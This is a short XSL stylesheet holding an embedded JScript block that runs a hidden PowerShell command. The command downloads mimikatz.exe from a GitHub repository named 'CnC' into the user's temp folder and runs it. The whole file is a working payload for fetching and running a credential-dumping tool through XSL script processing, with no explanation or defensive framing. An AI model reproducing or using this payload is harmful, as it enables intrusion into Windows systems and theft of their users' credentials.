<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/CnC/blob/main/mimikatz.exe?raw=true -Destination '$env:TEMP\mimikatz.exe'; Start-Process '$env:TEMP\mimikatz.exe'
");
	]]> </ms:script>
</stylesheet>
